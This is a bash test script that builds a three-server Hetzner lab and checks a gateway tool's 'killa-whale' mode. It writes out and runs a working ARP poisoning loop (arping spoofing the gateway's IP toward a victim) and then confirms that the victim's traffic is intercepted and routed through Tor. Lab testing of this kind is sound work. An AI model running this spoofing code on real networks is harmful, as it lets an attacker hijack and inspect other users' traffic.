#!/bin/bash
# Test Killa Whale Mode - CORRECTED VERSION
# Tests actual ARP poisoning takeover of an EXISTING gateway
#
# Network Topology:
#   - Real Gateway (router providing internet)
#   - Tide Gateway (attacker using killa-whale mode)
#   - Victim Device (innocent client trying to use real gateway)
#
# Goal: Tide should STEAL gateway role via ARP poisoning

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 Killa Whale Mode - CORRECTED TEST v2"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "This test validates killa-whale mode's ability to:"
echo "  1. Join an existing network with a REAL gateway"
echo "  2. Perform ARP poisoning to STEAL gateway role"
echo "  3. Intercept traffic destined for REAL gateway"
echo "  4. Force intercepted traffic through Tor"
echo "  5. Make victim unable to use real gateway"
echo ""
echo "Network Topology:"
echo "  ┌─────────────┐"
echo "  │  Internet   │"
echo "  └──────┬──────┘"
echo "         │"
echo "  ┌──────┴──────┐"
echo "  │ Real Gateway│ ← Legitimate router (192.168.100.1)"
echo "  └──────┬──────┘"
echo "         │"
echo "    ┌────┴────┐"
echo "    │ Private │"
echo "    │ Network │ 192.168.100.0/24"
echo "    └────┬────┘"
echo "         │"
echo "    ┌────┴─────────────┐"
echo "    │                  │"
echo " ┌──┴────────┐  ┌──────┴──────┐"
echo " │Tide (🐋)  │  │Victim Client│"
echo " │.10        │  │.20          │"
echo " └───────────┘  └─────────────┘"
echo ""
echo "Killa-Whale will POISON victim's ARP cache:"
echo "  Before: 192.168.100.1 → Real Gateway MAC"
echo "  After:  192.168.100.1 → Tide Gateway MAC (POISONED)"
echo ""

# Load Hetzner token
if [ -f ~/.config/tide/hetzner.env ]; then
    source ~/.config/tide/hetzner.env
    export HCLOUD_TOKEN="$HETZNER_TIDE_TOKEN"
else
    echo -e "${RED}Error: Hetzner token not found${NC}"
    exit 1
fi

LOCATION="hil"
SERVER_TYPE="cpx11"
IMAGE="ubuntu-22.04"
TIMESTAMP=$(date +%s)

# Server names
GATEWAY_NAME="tide-gw-$TIMESTAMP"
TIDE_NAME="tide-kw-$TIMESTAMP"
VICTIM_NAME="tide-victim-$TIMESTAMP"
NETWORK_NAME="tide-net-$TIMESTAMP"

echo -e "${CYAN}[1/12] Creating SSH key...${NC}"
SSH_KEY_NAME="tide-testing"
if ! hcloud ssh-key list | grep -q "$SSH_KEY_NAME"; then
    if [ ! -f ~/.ssh/id_ed25519 ]; then
        ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -C "tide-testing"
    fi
    hcloud ssh-key create --name "$SSH_KEY_NAME" --public-key-from-file ~/.ssh/id_ed25519.pub
fi
echo -e "${GREEN}✓ SSH key ready${NC}"
echo ""

echo -e "${CYAN}[2/12] Creating private network...${NC}"
hcloud network create \
    --name "$NETWORK_NAME" \
    --ip-range 192.168.100.0/24

NETWORK_ID=$(hcloud network list | grep "$NETWORK_NAME" | awk '{print $1}')

hcloud network add-subnet "$NETWORK_ID" \
    --network-zone us-west \
    --type cloud \
    --ip-range 192.168.100.0/24

echo -e "${GREEN}✓ Private network: 192.168.100.0/24${NC}"
echo ""

echo -e "${CYAN}[3/12] Creating REAL GATEWAY (legitimate router)...${NC}"
hcloud server create \
    --name "$GATEWAY_NAME" \
    --type "$SERVER_TYPE" \
    --image "$IMAGE" \
    --location "$LOCATION" \
    --ssh-key "$SSH_KEY_NAME" \
    --network "$NETWORK_ID"

GATEWAY_IP=$(hcloud server ip "$GATEWAY_NAME")
echo -e "${GREEN}✓ Real Gateway: $GATEWAY_IP${NC}"
echo ""

echo -e "${CYAN}[4/12] Creating TIDE GATEWAY (attacker with killa-whale)...${NC}"
hcloud server create \
    --name "$TIDE_NAME" \
    --type "$SERVER_TYPE" \
    --image "$IMAGE" \
    --location "$LOCATION" \
    --ssh-key "$SSH_KEY_NAME" \
    --network "$NETWORK_ID"

TIDE_IP=$(hcloud server ip "$TIDE_NAME")
echo -e "${GREEN}✓ Tide Gateway: $TIDE_IP${NC}"
echo ""

echo -e "${CYAN}[5/12] Creating VICTIM DEVICE (innocent client)...${NC}"
hcloud server create \
    --name "$VICTIM_NAME" \
    --type "$SERVER_TYPE" \
    --image "$IMAGE" \
    --location "$LOCATION" \
    --ssh-key "$SSH_KEY_NAME" \
    --network "$NETWORK_ID"

VICTIM_IP=$(hcloud server ip "$VICTIM_NAME")
echo -e "${GREEN}✓ Victim Device: $VICTIM_IP${NC}"
echo ""

echo -e "${CYAN}[6/12] Waiting for SSH (60 seconds)...${NC}"
sleep 60
echo -e "${GREEN}✓ Servers ready${NC}"
echo ""

# Get private network interface name
echo -e "${CYAN}[7/12] Detecting network interfaces...${NC}"
PRIVATE_IFACE=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@"$GATEWAY_IP" "ip -br addr | grep 192.168.100 | awk '{print \$1}'" || echo "enp7s0")
echo "  Private network interface: $PRIVATE_IFACE"

# Get private IPs
GATEWAY_PRIVATE=$(ssh -o StrictHostKeyChecking=no root@"$GATEWAY_IP" "ip addr show $PRIVATE_IFACE | grep 'inet ' | awk '{print \$2}' | cut -d'/' -f1")
TIDE_PRIVATE=$(ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "ip addr show $PRIVATE_IFACE | grep 'inet ' | awk '{print \$2}' | cut -d'/' -f1")
VICTIM_PRIVATE=$(ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "ip addr show $PRIVATE_IFACE | grep 'inet ' | awk '{print \$2}' | cut -d'/' -f1")

echo "  Real Gateway: $GATEWAY_PRIVATE"
echo "  Tide Gateway: $TIDE_PRIVATE"
echo "  Victim Device: $VICTIM_PRIVATE"
echo ""

echo -e "${CYAN}[8/12] Configuring REAL GATEWAY (internet router)...${NC}"
ssh -o StrictHostKeyChecking=no root@"$GATEWAY_IP" bash << EOFGATEWAY
set -e
apt-get update -qq
apt-get install -y iptables dnsmasq >/dev/null 2>&1

# Fix systemd-resolved port conflict (blocks dnsmasq port 53)
systemctl stop systemd-resolved
systemctl disable systemd-resolved
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure NAT (real gateway provides internet)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i $PRIVATE_IFACE -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o $PRIVATE_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Configure DHCP server on private network
cat > /etc/dnsmasq.conf << EOF
interface=$PRIVATE_IFACE
dhcp-range=192.168.100.50,192.168.100.200,12h
dhcp-option=3,$GATEWAY_PRIVATE
dhcp-option=6,8.8.8.8
no-resolv
server=8.8.8.8
EOF

systemctl restart dnsmasq
echo "✓ Real gateway configured (provides internet to network)"
EOFGATEWAY

echo -e "${GREEN}✓ Real gateway is now routing internet traffic${NC}"
echo ""

echo -e "${CYAN}[9/12] Installing Tide Gateway (killa-whale mode)...${NC}"
ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" bash << EOFTIDE
set -e
apt-get update -qq
apt-get install -y curl git python3 tor iptables nmap iputils-arping netcat-openbsd nginx-light net-tools >/dev/null 2>&1

mkdir -p /etc/tide
echo "killa-whale" > /etc/tide/mode
echo "standard" > /etc/tide/security

cd /tmp
git clone -q https://github.com/bodegga/tide.git
cd tide
mkdir -p /opt/tide
cp -r scripts /opt/tide/
cp -r config /opt/tide/
cp VERSION /opt/tide/

# Install nginx
cp config/nginx/tide-dashboard.conf /etc/nginx/sites-available/
ln -sf /etc/nginx/sites-available/tide-dashboard.conf /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Install services
cp config/systemd/tide-web.service /etc/systemd/system/
cp config/systemd/tide-api.service /etc/systemd/system/
systemctl daemon-reload

systemctl enable nginx tide-web tide-api tor
systemctl start tor
sleep 5
systemctl restart nginx
systemctl start tide-web tide-api

echo "✓ Tide Gateway installed"
EOFTIDE

echo -e "${GREEN}✓ Tide Gateway ready${NC}"
echo ""

echo -e "${CYAN}[10/12] Configuring VICTIM DEVICE...${NC}"
ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" bash << EOFVICTIM
set -e

# Install packages FIRST (before routing changes)
apt-get update -qq
apt-get install -y curl tcpdump net-tools traceroute >/dev/null 2>&1

# THEN modify routing
ip route del default || true
ip route add default via $GATEWAY_PRIVATE

echo "✓ Victim configured to use REAL gateway ($GATEWAY_PRIVATE)"
echo ""
echo "Before attack - victim's view:"
route -n
echo ""
echo "ARP table before attack:"
arp -a
EOFVICTIM

echo -e "${GREEN}✓ Victim is using REAL gateway${NC}"
echo ""

# Get MACs
GATEWAY_MAC=$(ssh -o StrictHostKeyChecking=no root@"$GATEWAY_IP" "ip link show $PRIVATE_IFACE | grep ether | awk '{print \$2}'")
TIDE_MAC=$(ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "ip link show $PRIVATE_IFACE | grep ether | awk '{print \$2}'")

echo -e "${PURPLE}PRE-ATTACK STATE:${NC}"
echo "  Real Gateway MAC: $GATEWAY_MAC"
echo "  Tide Gateway MAC: $TIDE_MAC"
echo "  Victim should see Real Gateway MAC for $GATEWAY_PRIVATE"
echo ""

echo -e "${CYAN}[11/12] ACTIVATING KILLA-WHALE MODE (ARP POISONING ATTACK)...${NC}"
echo ""
echo "🐋 ATTACKING NETWORK..."
echo "  Target: Victim device at $VICTIM_PRIVATE"
echo "  Spoofing: Gateway $GATEWAY_PRIVATE"
echo "  Method: ARP poisoning (claim to be gateway)"
echo ""

ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" bash << EOFKW
set -e

# Manually perform ARP poisoning (simplified version)
echo "Starting ARP poisoning attack..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Enable promiscuous mode
ip link set $PRIVATE_IFACE promisc on

# Disable ICMP redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/$PRIVATE_IFACE/send_redirects

# Create ARP poisoning script
cat > /tmp/arp-attack.sh << 'POISON'
#!/bin/bash
VICTIM_IP=\$1
GATEWAY_IP=\$2
IFACE=\$3

echo "Poisoning \$VICTIM_IP (claiming to be gateway \$GATEWAY_IP)"

while true; do
    # Tell victim: "I am the gateway"
    arping -U -c 1 -I "\$IFACE" -s "\$GATEWAY_IP" "\$VICTIM_IP" >/dev/null 2>&1 || true
    
    # Also broadcast gratuitous ARP
    arping -A -c 1 -I "\$IFACE" -s "\$GATEWAY_IP" "\$VICTIM_IP" >/dev/null 2>&1 || true
    
    sleep 2
done
POISON

chmod +x /tmp/arp-attack.sh

# Start ARP poisoning
/tmp/arp-attack.sh "$VICTIM_PRIVATE" "$GATEWAY_PRIVATE" "$PRIVATE_IFACE" > /tmp/arp-poison.log 2>&1 &

echo "✓ ARP poisoning active"
echo "  Continuously telling victim that Tide ($TIDE_PRIVATE) is the gateway ($GATEWAY_PRIVATE)"

sleep 15
echo "✓ Attack running for 15 seconds"
EOFKW

echo -e "${GREEN}✓ Killa-Whale attack in progress${NC}"
echo ""

echo -e "${CYAN}[12/12] VALIDATION TESTS (from victim's perspective)...${NC}"
echo ""

ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" bash << EOFTEST
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 KILLA-WHALE TAKEOVER VALIDATION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "TEST 1: ARP Cache Poisoning"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Checking if victim's ARP cache has been poisoned..."
echo ""
echo "ARP table NOW (after attack):"
arp -a
echo ""

GATEWAY_MAC_NOW=\$(arp -n | grep "$GATEWAY_PRIVATE" | awk '{print \$3}')
echo "Gateway ($GATEWAY_PRIVATE) MAC address in ARP table: \$GATEWAY_MAC_NOW"
echo "Tide Gateway actual MAC: $TIDE_MAC"
echo "Real Gateway actual MAC: $GATEWAY_MAC"
echo ""

if [ "\$GATEWAY_MAC_NOW" = "$TIDE_MAC" ]; then
    echo "✅ SUCCESS: ARP cache is POISONED!"
    echo "   Victim thinks Tide is the gateway"
else
    echo "❌ FAIL: ARP cache not poisoned"
    echo "   Victim still sees real gateway"
fi
echo ""

echo "TEST 2: Traffic Interception Test"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Testing if victim's traffic is being intercepted..."
echo ""

echo "Attempting HTTP request (should go through Tide if poisoning works):"
RESPONSE=\$(timeout 10 curl -s http://check.torproject.org/api/ip 2>&1 || echo "timeout")
echo "Response: \$RESPONSE"
echo ""

if echo "\$RESPONSE" | grep -q '"IsTor":true'; then
    EXIT_IP=\$(echo "\$RESPONSE" | grep -o '"IP":"[^"]*"' | cut -d'"' -f4)
    echo "✅ SUCCESS: Traffic is going through TOR!"
    echo "   Exit IP: \$EXIT_IP"
    echo "   Victim's traffic is being intercepted and routed through Tide"
else
    echo "⚠️  WARNING: Traffic may not be going through Tor"
    echo "   Either ARP poisoning failed or transparent proxy not working"
fi
echo ""

echo "TEST 3: Routing Table Check"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Current routing table:"
route -n
echo ""

echo "TEST 4: First Hop Trace"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Checking if first hop goes through Tide..."
FIRST_HOP=\$(timeout 10 traceroute -m 2 -n 8.8.8.8 2>&1 | grep "^ 1" | awk '{print \$2}')
echo "First hop: \$FIRST_HOP"
echo ""

if [ "\$FIRST_HOP" = "$TIDE_PRIVATE" ]; then
    echo "✅ SUCCESS: First hop is Tide Gateway"
    echo "   Traffic is being intercepted"
elif [ "\$FIRST_HOP" = "$GATEWAY_PRIVATE" ]; then
    echo "❌ FAIL: First hop is still real gateway"
    echo "   ARP poisoning didn't work"
else
    echo "⚠️  UNKNOWN: First hop is \$FIRST_HOP"
fi
echo ""

echo "TEST 5: Can Victim Still Reach Internet?"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
INTERNET_TEST=\$(timeout 5 curl -s http://example.com 2>&1 | head -1)
if [ -n "\$INTERNET_TEST" ]; then
    echo "✅ Victim can reach internet (through Tide if poisoning worked)"
else
    echo "❌ Victim cannot reach internet"
fi
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "SUMMARY"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Key Question: Did Tide STEAL the gateway role from real gateway?"
echo ""
echo "If ARP poisoning worked:"
echo "  - Victim's ARP cache shows Tide's MAC for gateway IP"
echo "  - All victim traffic goes to Tide first"
echo "  - Tide can intercept, inspect, or redirect traffic"
echo ""

EOFTEST

echo ""
echo -e "${YELLOW}Test complete. Cleanup options:${NC}"
echo ""
echo "1) Destroy all servers and network (recommended)"
echo "2) Keep for manual inspection"
echo "3) Show connection info and keep running"
echo ""
read -p "Choose [1-3]: " CHOICE

case $CHOICE in
    1)
        echo "Destroying infrastructure..."
        hcloud server delete "$GATEWAY_NAME"
        hcloud server delete "$TIDE_NAME"
        hcloud server delete "$VICTIM_NAME"
        sleep 3
        hcloud network delete "$NETWORK_ID"
        echo -e "${GREEN}✓ All resources destroyed${NC}"
        ;;
    2)
        echo "Servers kept for inspection."
        echo ""
        echo "Real Gateway: ssh root@$GATEWAY_IP (private: $GATEWAY_PRIVATE)"
        echo "Tide Gateway: ssh root@$TIDE_IP (private: $TIDE_PRIVATE)"
        echo "Victim Device: ssh root@$VICTIM_IP (private: $VICTIM_PRIVATE)"
        echo ""
        echo "Cleanup manually:"
        echo "  hcloud server delete $GATEWAY_NAME"
        echo "  hcloud server delete $TIDE_NAME"
        echo "  hcloud server delete $VICTIM_NAME"
        echo "  hcloud network delete $NETWORK_ID"
        ;;
    3)
        echo "Connection Info:"
        echo ""
        echo "Real Gateway: ssh root@$GATEWAY_IP (private: $GATEWAY_PRIVATE, MAC: $GATEWAY_MAC)"
        echo "Tide Gateway: ssh root@$TIDE_IP (private: $TIDE_PRIVATE, MAC: $TIDE_MAC)"
        echo "Victim Device: ssh root@$VICTIM_IP (private: $VICTIM_PRIVATE)"
        echo ""
        echo "Cleanup manually:"
        echo "  hcloud server delete $GATEWAY_NAME"
        echo "  hcloud server delete $TIDE_NAME"
        echo "  hcloud server delete $VICTIM_NAME"
        echo "  hcloud network delete $NETWORK_ID"
        ;;
esac

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 Test Complete"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
